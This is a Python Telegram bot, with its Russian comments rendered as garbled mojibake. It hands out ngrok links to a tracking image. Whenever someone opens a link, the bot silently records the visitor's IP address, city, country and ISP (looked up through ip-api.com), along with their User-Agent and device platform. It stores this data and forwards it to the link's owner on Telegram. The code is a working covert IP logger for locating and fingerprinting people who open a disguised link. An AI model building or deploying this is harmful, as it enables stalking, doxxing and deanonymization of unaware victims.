import json
import os
import datetime
import asyncio
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from quart import Quart, request, send_file
from pyngrok import ngrok
import threading
from cfg import *

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞ –∏ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞
bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Quart –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
app = Quart(__name__)

async def get_ip_info(ip):
    try:
        response = await asyncio.get_event_loop().run_in_executor(
            None, 
            lambda: requests.get(f"http://ip-api.com/json/{ip}")
        )
        if response.status_code == 200:
            data = response.json()
            return (
                f"üìç –ì–æ—Ä–æ–¥: {data.get('city', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
                f"üåç –°—Ç—Ä–∞–Ω–∞: {data.get('country', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
                f"üè¢ –ü—Ä–æ–≤–∞–π–¥–µ—Ä: {data.get('isp', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}"
            )
    except:
        pass
    return ""

@app.route('/')
async def serve_image():
    user_id = request.args.get('user_id')
    if user_id:
        # –ü–æ–ª—É—á–∞–µ–º —Ä–µ–∞–ª—å–Ω—ã–π IP —á–µ—Ä–µ–∑ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –ø—Ä–æ–∫—Å–∏
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent')
        request_url = str(request.url)
        platform = request.headers.get('Sec-Ch-Ua-Platform', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')
        mobile = request.headers.get('Sec-Ch-Ua-Mobile', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')
        
        data = load_data()
        if user_id in data:
            ip_info = await get_ip_info(ip_address)
            message = (
                f"üîç –ù–æ–≤—ã–π –ø—Ä–æ—Å–º–æ—Ç—Ä –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è!\n\n"
                f"üì± User ID: {user_id}\n"
                f"üåê IP –∞–¥—Ä–µ—Å: {ip_address}\n"
                f"{ip_info}\n"
                f"üíª –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: {platform}\n"
                f"üì± –ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: {'–î–∞' if mobile == '?1' else '–ù–µ—Ç'}\n"
                f"üîó URL –∑–∞–ø—Ä–æ—Å–∞: `{request_url}`\n"
                f"üìä User-Agent: {user_agent}\n"
                f"‚è∞ –í—Ä–µ–º—è: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            
            data[user_id].update({
                'last_ip': ip_address,
                'last_url': request_url,
                'last_user_agent': user_agent,
                'platform': platform,
                'is_mobile': mobile == '?1',
                'last_visit': str(datetime.datetime.now())
            })
            save_data(data)
            
            await bot.send_message(chat_id=user_id, text=message,parse_mode='markdown')
    
    return await send_file('i.png', mimetype='image/png')

async def run_quart():
    await app.run_task(host='0.0.0.0', port=5000)

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö –∏–∑ JSON —Ñ–∞–π–ª–∞
def load_data():
    if not os.path.exists('data'):
        os.makedirs('data')
    if os.path.exists('data/urls.json'):
        try:
            with open('data/urls.json', 'r') as file:
                return json.load(file)
        except json.JSONDecodeError:
            return {}
    return {}

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –≤ JSON —Ñ–∞–π–ª
def save_data(data):
    with open('data/urls.json', 'w') as file:
        json.dump(data, file, indent=4)

# –î–æ–±–∞–≤–∏–º –≥–ª–æ–±–∞–ª—å–Ω—É—é –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Ç—É–Ω–Ω–µ–ª—è
ngrok_tunnel = None

async def on_startup(dp):
    global ngrok_tunnel
    try:
        # –£–±–∏–≤–∞–µ–º –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã ngrok
        os.system("pkill -f ngrok")
        await asyncio.sleep(2)  # –ñ–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
        
        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–æ–∫–µ–Ω –∏ —Å–æ–∑–¥–∞–µ–º –æ–¥–∏–Ω —Ç—É–Ω–Ω–µ–ª—å
        ngrok.set_auth_token(tokenNgrok)
        ngrok_tunnel = ngrok.connect(5000)
        print(f"üåê –°–æ–∑–¥–∞–Ω —Ç—É–Ω–Ω–µ–ª—å: {ngrok_tunnel.public_url}")
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º Quart
        asyncio.create_task(run_quart())
        asyncio.create_task(command_handler())
        print("üöÄ –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω! –í–≤–µ–¥–∏—Ç–µ 'stop' –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏.")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ: {str(e)}")
        os._exit(1)

@dp.message_handler(commands=['start', 'help'])
async def send_welcome(message: types.Message):
    global ngrok_tunnel
    user_id = str(message.from_user.id)
    data = load_data()
    
    try:
        if user_id in data:
            public_url = data[user_id]['url']
        else:
            # –ò—Å–ø–æ–ª—å–∑—É–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π —Ç—É–Ω–Ω–µ–ª—å
            public_url = f"{ngrok_tunnel.public_url}?user_id={user_id}"
            data[user_id] = {
                'url': public_url,
                'created_at': str(datetime.datetime.now())
            }
            save_data(data)
        
        await message.reply(
            f"üëã –ü—Ä–∏–≤–µ—Ç!\n\n"
            f"üîó –í–æ—Ç –≤–∞—à–∞ —Å—Å—ã–ª–∫–∞:\n`{public_url}`\n\n"
            f"üîÑ –î–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Å—ã–ª–∫–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ /regen",
            parse_mode='markdown'
        )
    except Exception as e:
        await message.reply(f"‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(e)}")

@dp.message_handler(commands=['regen'])
async def regenerate_link(message: types.Message):
    global ngrok_tunnel
    user_id = str(message.from_user.id)
    data = load_data()
    
    try:
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π —Ç—É–Ω–Ω–µ–ª—å
        public_url = f"{ngrok_tunnel.public_url}?user_id={user_id}"
        data[user_id] = {
            'url': public_url,
            'created_at': str(datetime.datetime.now())
        }
        save_data(data)
        
        await message.reply(
            f"‚ú® –°—Å—ã–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∞!\n\n"
            f"üîó –ù–æ–≤–∞—è —Å—Å—ã–ª–∫–∞:\n`{public_url}`",
            parse_mode='markdown'
        )
    except Exception as e:
        await message.reply(f"‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(e)}")
def stop_bot():
    global running, ngrok_tunnel
    print("\nüõë –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –±–æ—Ç–∞...")
    if ngrok_tunnel:
        try:
            ngrok.disconnect(ngrok_tunnel.public_url)
        except:
            pass
    # –£–±–∏–≤–∞–µ–º –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã ngrok
    os.system("pkill -f ngrok")
    os._exit(0)

async def command_handler():
    global running
    while running:
        command = await asyncio.get_event_loop().run_in_executor(None, input)
        if command.lower() == 'stop':
            stop_bot()
        await asyncio.sleep(0.1)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)